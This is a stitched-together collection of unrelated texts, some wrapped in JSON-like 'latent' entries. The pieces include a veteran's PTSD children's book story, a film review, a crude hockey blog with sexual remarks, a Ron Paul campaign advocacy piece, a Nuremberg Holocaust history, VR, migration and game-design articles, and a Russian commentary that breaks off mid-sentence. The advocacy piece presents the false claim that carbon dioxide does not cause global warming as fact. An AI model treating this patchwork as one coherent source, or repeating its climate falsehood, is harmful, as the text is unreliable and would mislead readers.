Seth Kastle knows that tonight “bedtime” will be a little different.\n\nTonight, Seth will read his daughters \"Why Is Dad So Mad?\" — a book he wrote about himself.\n\nKastle served for 16 years in the Army Reserve, and was deployed to Qatar, Afghanistan, and Iraq. When he returned home to his wife and kids in Wakeeney, Kansas, he struggled with Post Traumatic Stress Disorder (PTSD) and had a hard time explaining it to his kids.\n\n\"I struggle with anger. That’s probably my main symptom. I also have some issues that go with my memory,\" Kastle said. \"There's mornings that you go into the bathroom and you look at the cup that holds your toothbrushes, and you just stare at it because you don't know which one is yours.\"\n\nKastle searched for resources to explain his PTSD to his children, but found the options lacking. So, he wrote a book and started a Kickstarter campaign to raise the funds to hire an illustrator and get the book published. The campaign met its $3,000 goal in just eight hours, and eventually swelled to more than $6,000.\n\n\"In my book I talk about the fire inside dad's chest. To me, that's what it feels like,\" Kastle said.\n\nIn \"Why Is Dad So Mad?\" a family of lions — representing the Kastle family — is battling to overcome the father lion’s PTSD. In the book’s colorful pages, the father lion is shown with a raging fire inside his chest. That image, and its message, made an impact on Kastle’s 6-year-old daughter, Raegan.\n\n\"No matter what, when they're mad or sad at you, they still love you,\" explained Raegan, admiring her father’s book in her playroom. \"There’s always a fire in his heart, but no matter what, I know there’s love.\"\n\nKastle — with help from illustrator Karissa Gonzalez-Othon and designer Lyndsey Dugan — wrote his book for his family, but he hopes that it will serve as a resource for other military families as well.\n\n\"I hope that other military families have a chance to sit down and explain to their kids that it’s not always going to be easy, but they’ll get through it,\" Kastle said.\n\nKastle is already working on his next book for military mothers with PTSD, and is using the extra funds from his Kickstarter campaign to finance it.\n\nAs Kastle turned the final page of his bedtime story book, his daughter Raegan wrapped her arm around her father and kissed him on the cheek. \"I like this book. I’m really proud you did it,\" she said.\n\nThe book is available now at www.kastlebooks.com.",

Smith Jr, Tin Welch, Dean R. Brooks.\n\n“In one week, I can put a bug so far up her ass, she don’t know whether to shit or wind her wristwatch“.\n\nIn 1934, Frank Capra’s “It Happened One Night” made Academy Awards history by becoming the first film to win all top five Oscars: Best Picture, Director, Actor, Actress & Screenplay. 80 years on, this is an accomplishment that has only been achieved twice since that time. Most recently was in 1991 with Jonathan Demme’s “The Silence of the Lambs” and the other (that’s the most deserving of them all) is this 1975 adaptation of Ken Kesey’s radical novel.\n\nRandall Patrick McMurphy (Jack Nicholson) is a convict who fakes insanity to escape the confines of prison and instead, spend his remaining years of incarceration in a mental hospital. McMurphy gets more than he bargain for though, when he comes across the tyrannical Head Nurse (Louise Fletcher). Rebelling against her control over the vulnerable patients, McMurphy turns the hospital ward upside-down with his wildly infectious and challenging personality, which incurs the wrath of the embittered Nurse.\n\nNow widely considered a classic of American cinema, “One Flew Over the Cuckoo’s Nest” was not without it’s problems in making it to the screen. The film rights to Kesey’s novel were actually owned by Kirk Douglas who starred in the 1963 Broadway production. However, there wasn’t a major studio that was interested in financing it. Douglas’ intention was to reprise the leading role but the film took so long to get off the ground, that it left him too old to play the part.\n\nBefore passing the rights down to his son, Michael Douglas, he recruited Czechoslovakia’s Milos Forman as a suitable director and even had a screenplay drafted up by Ken Kesey himself. It was Forman who rejected this version, though, as Kesey wanted to retain the mute, Native American, Chief Bromden as the narrator of the story (as it was in the novel) while Forman’s intention was to focus on McMurphy. This proved to be only the beginning of the films problems; Kesey was so incensed with the filmmakers approach to his material that he sued the producers and vowed never to watch the completed film while numerous actresses including; Audrey Hepburn, Jane Fonda, Ellen Burstyn, Anne Bancroft and Faye Dunaway turned down the, supposedly coveted, role of Nurse Ratched. Nicholson wasn’t even the first choice for McMurphy either; Marlon Brando, James Caan and (Kesey’s proffered choice) Gene Hackman turned down the part while Forman had expressed interest in Burt Reynolds.\n\nWith a sense of irony, it could be said that these fraught production issues actually reflected the fraught and rebellious themes of the material but despite the hiccups, the film opened to widespread critical acclaim and went from a $3 million budget to gross over $100 million and as well as sweeping the board at the Academy Awards, it received a further four nominations.\n\nNicholson may not have been the first choice but there’s no doubt that he was born to play McMurphy. He’s an actor that has always produced high quality performances and has even become synonymous with rebellious characters but this is the absolute definitive, The only difference between actor and character is that Nicholson’s appearance is nothing like the flame-haired Irishman described in the book (where it’s easy to see why Kesey might prefer Hackman) but he’s McMurphy in every other hazardous and feral way. He’s the perfect embodiment of the character’s reactionary behaviour against the repressive and authoritarian figurehead of Louise Fletcher’s villainous and castrating Nurse Ratched.\n\nAlthough it’s these two stupendous performances that anchor the film, the rest of the supporting cast are equally solid – with particular mention going to Brad Dourif and his nominated turn as the stuttering, immature Billy Bibbit. Also not going unnoticed is the haunting score by Jack Nitzsche and the striking cinematography by Haskell Wexler in capturing the stark, enclosed environment that reflects the perceived insanity of the inmates.\n\nWhether observed from the point of view of Chief Bromden or R.P. McMurphy, it doesn’t matter, as there’s still no denying that it retains the free-spirited theme’s of Kesey’s novel and the revolutionary and anti-establishment ethos that was rife throughout a generation. A masterful adaptation where Milos Forman and screenwriters Lawrence Hauben and Bo Goldman put their own stamp on the indicting material without losing any of it’s emotive or uplifting power. Simply superb!\n\n(Included in My Top Ten films)\n\nMark Walker\n\nTrivia: The play opened on Broadway in New York City, on 13 November 1963 and closed on 25 January 1964 after 82 performances. The opening night cast included Kirk Douglas as R.P. McMurphy, William Daniels as Dale Harding and Gene Wilder as Billy Bibbit.\n\nAdvertisements",

And I’m thinking “yea Dave, that’s just a great idea, we’re at the tail end of a polar vortex and one of America’s coldest weather front in history and going to an ice rink is exactly what I wanted to do”. Meanwhile Asa says, “come pick me up, that sounds fun!”\n\nBobby Trivia captains an ice hockey team in Panorama City and all you need to know about the city is that Kirk Cameron - actor turned ape shit Christian was born there. The name of the team is the Coyotes and are currently in the middle of the standings about to play the Snipers, the best team in their league. It should be a fun game…or they’ll get their ass kicked.\n\n. As I start making my way toward primate heaven, I get a text from Asa with one of those celebrity excuses “…running around for AVN. I’m too exhausted to go, count me out”. Exhaustion? What the hell is she talking about, we just saw her have a 20 minute sex scene in Insatiable 2 where she gets dragged on the floor by her hair and some beast of a man pounds the makeup off her face. But now she’s “exhausted”.\n\n. Getting into the ice rink, its colder inside than it is outside. Is that possible? I eat some cold baked potato chips. No bueno.\n\n. The game is about to start, but hey, no national anthem. What kind of communist run ice rink is this.\n\n. The Coyotes come out on the floor one by one. Holy shit, here comes Bobby Trivia in his robocop helmet and thick padding that makes him look like he’s wearing the original transitor powered Ironman armor underneath - not the Mark V. He’s going to hurt someone easily.\n\n. Than a small guy comes out, its Yen Yen bill, y'alll, Bobbys personal assistant. But he’s not big, more like Astro boy zipping around the ice. No one catches that guy. Yen is quick like an apple juice ejaculation.\n\n. The other team scores the first goal but Yen comes right back and scores!\n\n. The other team scores the 2nd goal but Yen comes right back and scores again! Why doesn’t Yen have his own jersey, he’s got some generic white sweatshirt on. C'mon man, he’s like the team’s best player.\n\n. The other team scores the 3rd goal and someone I don’t care about on the Coyotes ties it up again.\n\n. I’m cheering them on and realize I’m the only fan so I lose a bet with Asa made earlier. I thought there would be more than 9 fans. Apparently Asa was right, Everyone does hate Trivia.\n\n. There’s a chaotic scuffle going on in front of the goalie when Bobby rides up, swings his stick and while everyone is wincing in slow motion, the goal flutters in for the go ahead score. 4 to 3. Everyone’s cheering!\n\n. A few guys play with long long blonde hair tied up in a pony tail. That looks weird. 60’s hippie, weed farmer, college drop out yes. Hockey player no.\n\n. The other team has the puck and is heading toward their net but they’re avoiding Bobby and heading toward the other Defenseman - who turns around and is skating away. Errrr, I don’t know hockey but aren’t you suppose to be defending your goal with your back to the net, not skating away. Well, the other team ties it up and they head into overtime.\n\n. The Coyotes lose the shoot out and the game.\n\nOh man, the pain of losing hurts - might as well lick a flag pole while you’re at it. Bobby, Yen and I go to some bar down the street and grab some console time. Nice to get some venting done.

  "latent_425": "Even though most of the potential contenders for the Republican presidential nomination in 2012 have not formally announced their intentions yet, the truth is that the race has already begun. Just look at all of the Republican politicians that have scheduled visits to Iowa. Potential candidates are gearing up their campaigns and it should be one of the most interesting primary seasons in ages. But is there anyone in the field that is really that much different from George W. Bush and John McCain? Is there anyone that is not just going to trot out the same tired old ideas? Is there anyone that would actually do something substantial about government debt? Is there anyone that actually wants to shut down the Federal Reserve? Is there anyone that would actually work to restore our civil liberties? Well, the truth is that most of the potential Republican candidates are virtual clones of George W. Bush and John McCain. There are very few in the field that offer any hope whatsoever. But there is one man that does stand out as being very different. His name is Ron Paul.\n\nIs Ron Paul perfect? No, of course not. Nobody is perfect. But at least Ron Paul is against a lot of the nonsense that went on under George W. Bush. At least Ron Paul would fight for our civil liberties. At least Ron Paul is courageous enough to publicly oppose the Federal Reserve.\n\nWhen you look at the rest of the potential Republican candidates for 2012, most of them are very, very similar.\n\nWhat the Republicans need in 2012 is someone new and fresh.\n\nThe following are 12 reasons why Ron Paul is very different from most of the other contenders for the Republican presidential nomination in 2012….\n\n#1 Ron Paul Is Against Big Government\n\nFor decades, nearly all Republican politicians have given wonderful speeches about the dangers of “big government”, but when they have gotten into office nearly all of them have supported the expansion of government.\n\nFor example, George W. Bush gave speech after speech in which he railed against the dangers of “big government” and then he went out and expanded the size of government more than any other president that had ever come before him.\n\nWell, Ron Paul is one of those rare Republicans that is actually not a RINO (“Republican in name only”). In fact, there are so many RINOs running around that even the word “Republican” has become a bad word to many people.\n\nBut when Ron Paul talks about smaller government he actually means it. Just take a look at his voting record over the years.\n\nNot only that, but Ron Paul’s son, U.S. Senator Rand Paul, just publicly proposed 500 billion dollars in spending cuts in the Wall Street Journal. Both Ron Paul and Rand Paul are men of their words. If Ron Paul became president, we would finally have someone in the White House that would actually be serious about smaller government.\n\n#2 Ron Paul Wants To Shut Down The Federal Reserve\n\nWho wrote a book entitled “End The Fed”?\n\nOh yeah, it was Ron Paul.\n\nWho spearheaded the push to audit the Federal Reserve during the last session of Congress?\n\nOh yeah, it was Ron Paul.\n\nDid you know that the Federal Reserve has never been the subject of a true comprehensive audit since it was created in the early part of the last century? The reality is that the people of the United States have a right to know what is going on over at the privately owned central bank that has almost complete control over U.S. currency and banking. The Federal Reserve played a leading role in creating the horrific economic crisis that the U.S. is currently experiencing, but right now the Federal Reserve has very little accountability to the U.S. Congress or to anyone else for that matter.\n\nRon Paul wants to fundamentally change that.\n\nSo how many other potential Republican candidates have come out and declared that they want to shut down the Federal Reserve?\n\nNone.\n\n#3 Ron Paul Wants to Abolish The IRS\n\nTalk about a great idea!\n\nThe truth is that we do not need a personal income tax and we do not need the IRS.\n\nIn fact, the U.S. got along just fine without a personal income tax for most of our history.\n\nRon Paul wants to permanently get rid of the IRS.\n\nSo how many other potential Republican candidates are proposing that we abolish the IRS?\n\nThe silence is deafening.\n\n#4 Ron Paul Would Enforce Our Borders\n\nMany Republicans talk a good game about enforcing our borders, but very few of them ever actually do anything about it.\n\nRon Paul is different. Ron Paul believes that we should stop the endless flood of illegal immigrants that is coming across our borders. He would be the first president in generations that would actually do something real about this problem.\n\nRon Paul is against amnesty for illegal aliens and he also believes that children born in the United States to illegal aliens should not be automatically granted citizenship.\n\nIllegal immigration is a national crisis and we need a president that would take this issue seriously for a change.\n\n#5 Ron Paul Is Against Globalization\n\nNearly all of the potential Republican candidates for president are in favor of the globalization of the economy and nearly all of them love all of the free trade agreements that the United States has agreed to.\n\nWell, Ron Paul is different.\n\nRon Paul would put the breaks on a lot of this globalization.\n\nRon Paul is against NAFTA and thinks it should be repealed.\n\nRon Paul voted against CAFTA.\n\nRon Paul voted against the U.S.-Australia free trade agreement.\n\nRon Paul voted against the U.S.-Singapore free trade agreement.\n\nRon Paul voted against the U.S.-Chile free trade agreement.\n\nRon Paul has voted to withdraw the United States from the WTO.\n\nNot that Ron Paul is a total protectionist either. But the truth is that he would take much more of a stand against the globalization of the world economy than just about any other potential Republican candidate for president.\n\n#6 Ron Paul Was Against The Wall Street Bailouts\n\nAt the same time that George W. Bush, Barack Obama and John McCain were all running around promoting the Wall Street bailouts during 2008, Ron Paul was one of the most outspoken opponents against the bailouts.\n\nRon Paul did not understand why countless billions of U.S. taxpayer dollars should go to Wall Street elitists.\n\nIn the end, many politicians wished that they had been against those bailouts. They ended up being a really bad idea. Large numbers of conservatives and large numbers of liberals were both disgusted by them.\n\nWell, let us not forget that Ron Paul was right about those bailouts from the very beginning.\n\n#7 Ron Paul Would Protect Our Civil Liberties\n\nRon Paul said that if we passed the “Patriot Act” and all of these other fascist police state pieces of legislation that we would lose our individual liberties.\n\nDid that not happen?\n\nBut neither major political party is taking any action to repeal the Patriot Act.\n\nUnder George W. Bush, Americans lost huge amounts of liberty and freedom.\n\nMany Americans had been hoping that Barack Obama would be much better in that regard.\n\nWell, it turns out that Barack Obama has been even worse. He has implemented some things that George W. Bush never would have been able to get away with.\n\nHave you been to an airport recently? It is completely and totally ridiculous out there.\n\nRon Paul is against these abuses and would fundamentally change the direction of the United States when it comes to civil liberties.\n\n#8 Ron Paul Would Not Have The U.S. Trying To Police The World\n\nDid you know that the U.S. has forces in 130 different countries today?\n\nIt is absolutely ridiculous!\n\nWe simply cannot afford to be the police of the world.\n\nIf we endlessly bomb, invade and occupy other countries and torture everyone in sight then people around the world are going to end up hating America.\n\nMany Americans had been hoping that Barack Obama would change the course of our foreign policy when he was elected, but that did not happen did it?\n\nInstead, Barack Obama is promising to keep at least some troops in Iraq for many years, and he has sent a lot more troops to Afghanistan.\n\nWell, Ron Paul is different.\n\nRon Paul is the only potential Republican candidate that actually voted against the Iraq war.\n\nRon Paul would dramatically reduce the number of our troops deployed overseas and he would be determined not to interfere in the affairs of other nations.\n\nThat would be quite a switch, wouldn’t it?\n\n#9 Ron Paul Is Against Carbon Taxes And The Global Warming Fraud\n\nTens of millions of Americans blindly believe in the environmental quackery of Al Gore, the “eco-prophet”, who is trying to “save the environment” by viciously attacking carbon dioxide. Ron Paul is one of the few members of Congress who is willing to publicly stand up and tell the truth that carbon dioxide is one of the fundamental building blocks of life on earth and that it is NOT causing global warming.\n\nBut the American people did not elect Ron Paul back in 2008. Instead they elected Barack Obama who wants to impose an insane “cap and trade” carbon trading scheme that would decapitate the U.S. economy.\n\nWell, now that the American people have seen the insanity of what Barack Obama is trying to do hopefully they will be ready for something different in 2012.\n\n#10 Ron Paul Is Deeply Concerned About The U.S. National Debt\n\nDid you know that right now our national debt is $14,104,021,737,251.53?\n\nDid you know that if the federal government began right at this moment to repay the U.S. national debt at a rate of one dollar per second, it would take over 440,000 years to pay off the national debt?\n\nRon Paul is one of the few members of Congress that actually has a voting record that shows a consistent effort to reduce government spending and government debt.\n\nMany other Republicans talk a good game about these things, but their voting records tell a whole different story.\n\n#11 Ron Paul Would Provide Real Leadership\n\nThe liberty movement in the United States desperately needs a true leader right now, and Ron Paul can provide the kind of inspirational leadership that most other Republican politicians simply cannot. Tea Party activists are inspired by Ron Paul. They respond to his leadership. The truth is that the Republicans have not had a truly inspirational conservative leader in the White House since Ronald Reagan. It is about time they had another.\n\nNot only that, but most of the other potential Republican contenders have a ton of skeletons in their closets. Ron Paul is one of those rare politicians that still has his integrity intact.\n\n#12) Ron Paul Has Perhaps The Best Chance Of Defeating Barack Obama\n\nPoll after poll has shown top Republican contenders such as Sarah Palin getting absolutely destroyed in a potential matchup with Barack Obama.\n\nMost Americans view most of the potential contenders for the Republican nomination in 2012 as simply newer versions of George W. Bush and John McCain. In fact, when you listen to most of them talk, that is exactly what they are. They are just rehashing the same tired ideas that establishment Republicans have been pushing for decades.\n\nIf the Republicans want to win in 2012, they need something different.\n\nThey need someone that is a sharp break from George W. Bush and John McCain.\n\nThey need someone that can get us back in touch with the U.S. Constitution and with the principles that the millions involved in the Tea Party movement have been trying to restore.\n\nSo is Ron Paul the right choice?\n\nThat is for you to decide.",

  "latent_633": "Nuremberg Nuremberg 1493 Nuremberg is a city in the German state of Bavaria, and forever synonymous with the Nazi rallies which were held annually from 1927 to 1938, the infamous Nuremberg Racial Laws and the home of Julius Streicher the publisher of Der Sturmer, which was fiercely anti-Semitic. Jews had lived in Nuremberg from the 12th century, the Jewish community knew periods of prosperity and growth, as well as riots and expulsions, in 1922 the Jewish community was 9,280 the second largest in Bavaria. Many of Nuremberg’s Jews were affluent merchants, industrialists, bankers and professionals. Their situation took a turn for the worse after the founding in Nuremberg of Der Sturmer, the notorious Nazi weekly newspaper, by Julius Streicher in 1923. Edition of the anti-Semitic Der Sturmer This was also the year of Hitler’s putsch attempt in Munich, and 1923 young uniformed Nazi’s roamed the streets of Nuremberg attacking hundreds of Jews and desecrated the Jewish cemetery. One Jew died of his wounds, during these disturbances. The Reich Union of Jewish Frontline Soldiers reacted by posting armed guards at Jewish community institutions, riots against Jews continued and intensified after the Nazis success in the 1930 elections. In Nuremberg assaults on the Jewish community after the Nazis rise to power were worse than in other German cities, on the 20 July 1933, SA storm-troopers broke into four hundred Jewish houses and confiscated cash and savings accounts; some 300 Jews, most of them members of the fraternal order B’Nai B’rith were arrested by the SA, herded into empty lots in the suburbs, and beaten up. From the beginning of the Nazi regime in January 1933 until the 31 March 1934, 1,476 Jews left Nuremberg. The rate decreased sharply thereafter, and in the year beginning April 1937, only 298 Jews left the city. Hebrew class, Nuremberg Jewish Center 1937 The Nazis efforts to rid the city of its Jews were countered by the Jews radical re-organisation of their religious, educational, cultural, and social life, with the object of making themselves independent of their hostile environment. At the same time the Jewish community organisation’s revenue and expenditures increased, unlike those of other Jewish communities in Germany. This was made possible by the Jews generally strong economic condition, with 728 Jewish enterprises still in existence at the end of 1936. On the 8 November 1937 an exhibition opened in the city, “The Eternal Jew,” portraying the Jew as a taskmaster for international Bolshevism, aimed at enslaving Germany within the Soviet system. The main Synagogue in Nuremberg On the 10 August 1938 on the orders of Streicher, the Great Synagogue and the adjacent Jewish community building were torn down, under the pretext “that they were spoiling the look of the city.” The synagogue’s Jewish Stone, a remnant of a medieval synagogue that served as the base for the Holy Ark, was saved by a non-Jewish architect. On Kristallnacht, which took place throughout the Reich, at 2.00am, SA men armed with sticks gathered in the main city square and set fire to the Adas Israel synagogue, and the Ahiezer prayer hall. Gangs of Nazi thugs went on a rampage through the streets of the city attacking Jews and wounding hundreds of them; sixteen Jews were murdered and ten committed suicide. These twenty-six victims constituted a substantial proportion of the total loss of life among German Jewry on Kristallnacht. One hundred and sixty Jews living in Nuremberg were arrested and ill-treated in the city’s prison, and most of them were later sent to the Dachau concentration camp, hundreds of Jewish apartments and businesses were ransacked by the Nazi hoodlums. Julius Streicher Sensing now that the tide had turned the Jews of Nuremberg began to flee the city, Nazi Party leaders encouraged city officials bought up Jewish-owned property at a fraction of its value. The corrupt practices at this time were so outrageous that the authorities had to set up a commission of inquiry, which denounced the events that had taken place and called for the punishment of those responsible. On the 29 November 1941, 535 Jews from Nuremberg were deported to Riga; on the 24 March 1942, 650 Jews were sent to Izbica near Lublin; and on the 10 September of that year, 686 Jews were deported to Theresienstadt. From these three deportations, only a handful of Jews survived, another 139 Jews were deported in four different groups, and 67 more were deported on an individual basis. In the autumn of 1942, after several dozen Jews had been transferred to the nearby city of Furth, the only Jews left in the city were those married to non-Jews. 1935 rally in Nuremberg The Nazi newspapers boasted that Nuremberg had become Judenrein – cleansed of Jews. The city was severely damaged by the Allied bombing campaign, on the 2 January 1945 the medieval city centre was systematically bombed and about 90 percent of it was destroyed in one hour, with 1,800 loss of live and 100,000 people displaced, further bombing raids in February 1945 and in total circa 6,000 Nuremberg residents are thought to have been killed in the Allied air raids.

Jews from Nuremberg prior to their deportation to Zbaszyn About 65 of the former inhabitants returned after the war and a community was reorganized, which numbered 181 in 1952 and 290 in 1970. In 1984 a new community center with a synagogue was opened. The Jewish community numbered 316 in 1989; 200 in 1990; and about 1,450 in 2005. More than 80 percent of the members are immigrants from the former Soviet Union. The Soviet Union wanted the war crimes trial to be held in Berlin, but the other victorious Allied Governments wanted the trials to be held in the American Zone, in a city which symbolised the Nazi Party, and the Palace of Justice was spacious and undamaged, with a large prison as part of the complex. The trial began on the 20 November 1945 and it ended on the 1 October 1946 with most of the leading Nazis being sentenced to death, or long prison sentences\n\nTimeline of major events that occurred in Nuremberg during the years of the Third Reich 1933 Hitler, with his uncanny ability to sense the mood of the people, selected Nuremberg as the site of the annual high mass of his regime, even before he became Chancellor in 1933.

Jews were prohibited from holding jobs in the civil service, from marrying Germans and Jews lost their rights as German citizens. Jews were later forced to live in ghettos and wear special armbands to easily distinguish them. Faced with such persecution, 130000 Jews left Germany . 1936 At the Party Rally in Nuremberg in 1936, Hitler announced the establishment of the Four Year Plan and the appointment of Goering as the Plenipotentiary in charge. 1937 In December 1937, the French consul in Nuremberg noted that the increasingly strict application of the Nuremberg Laws by the Nazis \"could only precipitate the recent movement of emigration that has taken place in recent months.\" Other consuls were also ...In December 1937, the French consul in Nuremberg noted that the increasingly strict application of the Nuremberg Laws by the Nazis \"could only precipitate the recent movement of emigration that has taken place in recent months.\" Other consuls were also predicting a renewed Jewish exodus in light of stricter German border controls—Jews, even those who had left on short-term visas, were no longer being allowed to return. 1938 Nuremberg Laws were expanded by new anti-Jewish decrees.

Jewish men and women with non-Jewish names were ordered to add Israel or Sarah to their names. All Jews 15 years of age and older were ordered to carry their identification cards with them at all times. A big letter J was stamped on their passports. Jews were prohibited from living in blocks of flats inhabited by Aryans, going to theatres, cinemas and swimming pools or walking on the Aryans' sidewalks. 1939 GAULEITER STRETCHER, at a great demonstration organized yesterday evening in Nuremberg on the occasion of the German troops' entry into Bohemia and Moravia, made the following statement: \" This is only a beginning: far ...No. 74 M.

  "latent_967": "At Oculus Connect last year Oculus CTO John Carmack stated that mobile positional tracking was problem that he wants “solved right now,” wishing that “somebody had spent all of this last year on it.” While Carmack has recently said that he has shifted his personal focus to the problem it turns out somebody has been working on it for the last year, and they may have arrived at a solution.\n\nUnivrses, who we first covered a year ago to the day, has been developing a mobile VR positional tracking solution that uses only the regular camera on a phone. Since we covered them originally the company has been fairly quiet, outside of announcing they are developing a magic casting game for VR called Wands. But a year’s worth of heads down development on a single issue can yield results, and now they are finally ready to reveal their solution to the world at this year’s Mobile World Conference.\n\n“You get these moments where you walk around totally untethered,” says Ricky Helgasson, Univrses CEO and founder, “and you get butterflies in your stomach from how cool it is. After a session like that, it’s easy to continue pursuing the end goal of high quality positional tracking for mobile headsets.”\n\nDubbed Playground, Univrses’ solution utilizes a computer vision technique known as simultaneous location and mapping, or SLAM for short, to determine where a user is in space. Basically they are able to use the phone’s camera, accelerometer and gyroscope to determine the phone’s location in 3D space in a mapped room.\n\nThe user can also map their playspace prior to starting the game, similar to how one would set the bounds for the HTC Vive. According to Helgesson, this allows for less stress on the CPU, leaving more room for actual VR and AR applications to run and burning less battery. Users won’t have to map their environment before using the system, but it’s an option. Another method that maps continuously consumes battery power more quickly. This also means you can quickly turn on positional tracking in scenarios like when you are sitting on an airplane, with nearly “instant initialization.”\n\nHelgesson says the company is currently working with the Gear VR and “other headsets based on specific agreements in AR and VR” and plan to release their software “before summer.” For developers Univrses is planning to release a C API that can be used with any game engine, as well as a Unity plugin on to of the C API. The company is also exploring releasing “ready-to-go plugins” for other engines in the future.\n\nThe real question is though, will it work?\n\nUnivrses earlier iterations were marred by jitter caused by imperfections in the tracking algorithm. This made the scenes fairly nauseating to watch, even in a 2D video.\n\nWatching the latest videos, however, that jitter appears to be significantly reduced however it is hard to tell how it will translate into the headset. We will be going hands on with it and Univrses’ mobile VR game, Wands, at the Mobile World Conference next week and will be sure to report back with our impressions.\n\nMobile VR currently stands somewhere between the experience of the first Oculus developer kit and the second, but if Univrses is able to add positional tracking to it mobile VR may end up being the killer platform earlier than expected.\n\nClarification: This post was updated from its original version to clarify the method of position tracking.\n\nTagged with: computer vision, gearvr, mobile VR, positional tracking, univrses",

  "latent_1378": "More than half of all British and French citizens would support sending military troops to Calais, France, a YouGov poll reported Sunday. The port city has been in crisis in recent weeks as thousands of migrants and asylum seekers, mostly from the Middle East and North Africa, have tried to pass from France into Britain through the Eurotunnel that runs under the English Channel.\n\nRoughly 54 percent of French and 67 percent of Britons polled said they would support sending their nation's military to Calais to control the situation and prevent people from entering the tunnel, the poll found. Almost every night, thousands of migrants, many of whom first entered Europe through southern Mediterranean ports seeking asylum, have tried to enter the tunnel through its entrance in Calais. Several people have been killed while walking through the tunnel, which carries vehicular traffic as well as the Eurostar bullet train.\n\nHeated debate has erupted in France and Britain in recent weeks over which country has the responsibility to find a solution to the migrant crisis and how it should be handled. The French government has tried to build a high fence around the tunnel entrance in Calais, but as migrants become more desperate, the situation has continued to spiral out of control.\n\nPhoto: Agence France-Presse/Getty Images\n\n\"We have only 15 permanent French border police at the Eurotunnel site. Can you imagine how derisory this is, given the situation?\" said Bruno Noel, head of the police alliance deployed to Calais, the Local reported Tuesday. \"So I say, why not bring in the British army, and let them work together with the French?”\n\nThe YouGov survey also asked respondents what factors or entities they thought were responsible for the situation in Calais, showing a striking difference of opinion between French and British respondents. Roughly 40 percent of British people polled responded that the French government was responsible, while only 11 percent of French thought the British government was responsible. But 41 percent of French respondents and 48 percent of British thought both countries were responsible.\n\nThe survey polled 1,972 people in Britain and 1,001 people in France, with an unreported margin of error.",
  "latent_1550": "The following blog post, unless otherwise noted, was written by a member of Gamasutras community.\n\nThe thoughts and opinions expressed are those of the writer and not Gamasutra or its parent company.\n\nThe golden age of big budget space sims is over. Publishers like LucasArts, Origin, Electronic Arts, Interplay, THQ, Microsoft used to make space sims. Now they don't. The space sim fanbase, once a major audience, hasn't grown large enough to support modern AAA game budgets.\n\nSome indie/small developers have taken up the slack. There's an opportunity for us to create a game we love for a niche audience, without having to compete against big budget studios.\n\nscreenshot: Salvation Prophecy\n\nThis was my mindset when I set out developing my space sim, Salvation Prophecy. I've learned a bit about the challenge of designing space sims along the way.\n\n1. Many Opposing \"Deal Breaker\" Features\n\nIf you read up on space-sim reviews, fan sites, or forums, you'll see widely opposing opinions about what space sim fans want to see. Such as:\n\ncockpit view vs. external ship view\n\njoystick vs mouse vs gamepad\n\nrealistic Newtonian physics vs \"arcadey\" controls\n\nsingle player vs multi-player\n\nstory/mission based vs free roaming\n\nfantastic space (bright nebulae, dense asteroid fields, etc) vs. realism (black star-fields)\n\nSometimes the developer can cover both - maybe you manage to pull off both cockpit and ship view. But the combinatorial explosion of features gets very limiting very fast. There's almost no way you can cover everything, and still make a good game.\n\nThis really segments the space sim audience, and this is a big problem for the genre. Space sim fans tend to be very particular about what they like and dislike. So if you've created the almost perfect game (in the eyes of one fan), but you happen to use ship view instead of cock-pit view, it can be a deal breaker.\n\n2. Massive Feature Wish-List\n\nMost genres have a pretty big list of features players would love to see. But the Space Sim wish-list is insane. This is partially because the space sim genre draws from some pretty divergent sources. Take Star Trek and Star Wars - they have pretty different visions of what life in future space is like, and players seem to want both. The space sim genre itself is fragmented too, from combat dog-fights, to trading, to fleet command, to 4X empire building.\n\nSo again, the niche space sim fan-base is segmented. This time, along divergent wish lists of dream features, like:\n\nship crews\n\nplanet landings\n\nseamless transitions across galaxies and planets\n\nspace station interiors\n\nhuge/infinite universe\n\nmodular ship customization\n\ntrading and economy\n\na \"live\", \"busy\" open world design with lots of space traffic\n\ncapital ship command\n\nhuge variety of pilotable ships\n\nsci-fi interactions with aliens\n\naction space \"dog fights\"\n\nempire building\n\ncomplex faction diplomacy\n\nvarying play styles: trader, mercenary, pirate, bounty hunter, ...\n\nship boarding\n\nasteroid mining\n\nfleet command\n\n...\n\nIt's a tough crowd to please. No matter what you do, a lot of people are going to be unimpressed. The most you can hope for is a segment of the space sim crowd who dig the particular features of your game, or a niche within a niche.\n\nDon't get me wrong - I'm super pumped to be making a Space Sim. But it's a tough gig.",

  "latent_1739": "+ T -\n\nПоделиться:\n\nПрезидент США Барак Обама, выступая перед Конгрессом, сказал, что Россия утратила влияние на Украину и Сирию, но продолжает тратить на них ресурсы, хоть ее экономика и ослабевает. Александр Невзоров объяснил «Снобу», почему России так и не удалось выглядеть серьезно в глазах политических оппонентов\n\nДля России самое важное — это не то, хороший Путин или плохой, а то, жизнеспособна ли конструкция, которую он пытается построить, или нет. Стоит ли восстановление призрачной, хрупкой империи благосостояния и благополучия пары-тройки поколений или нет. Лично я считаю, что нет, а президент, видимо, наоборот. Это нормальное цивилизационное противостояние, и нельзя на 100 процентов точно сказать, кто из нас прав, но я прекрасно знаю, насколько хрупки империи, я принимал участие в спасении парочки. Сегодня это нежизнеспособная конструкция, и платить за нее такую огромную цену неразумно и просто бессмысленно.\n\nДа, российская публика ради призрачной мечты об империи готова помучиться, потерпеть лишения. У Путина ведь действительно огромная поддержка. Другое дело, что к этому пришли не совсем корректным путем: тем людям, которые орали, что Крым наш, никто не объяснял, что весь этот геополитический банкет может закончиться трагически. Может, если бы они это знали, поддержка президента изначально не была бы такой яростной.\n\nПутин строит империю и делает свое дело великолепно, хоть ему, бедняге, и приходится трудно. Ведь одно дело — строить империю из миллионов покорных крепостных и безгласных гоголевских чинуш, а другое дело — из тех фекалий, которые предлагает сегодняшняя реальность. Это практически невозможно.\n\nТак вот, лидеры других стран прекрасно это видят — это видят вообще все, кроме зрителей наших федеральных телеканалов. Но, что бы Россия о себе ни думала, Обамушка уже разлила нефтюшку. Что ж, теперь, вероятно, еще несколько десятков тысяч россиян прилепят на задницы своих автомобилей декларацию о том, что Обама — чмо. И ведь они будут счастливы. Нам бы с вами их бездумность; только вот нас с вами в этом вопросе как-то обделили, и нам вся эта ситуация ни малейшего удовольствия не доставляет.\n\nИмперская идеология — это тяжелая болезнь, я и сам болел ей. Она берется из так называемой русской культуры, из православия и набора всех тех архаичных и очень ядовитых субстратов, которыми жила и до сих пор живет Россия. Получается это так: страна, у которой никогда не было никакой культуры, кроме абсолютно дикарской или заимствованной от монголов, вдруг в XVIII–XIX веке инфицируется мощной европейской культурой. Понятно, что она производит с этой культурой чудовищные метаморфозы: народ начинает сам себя убеждать в том, что он — народ-богоносец и у его 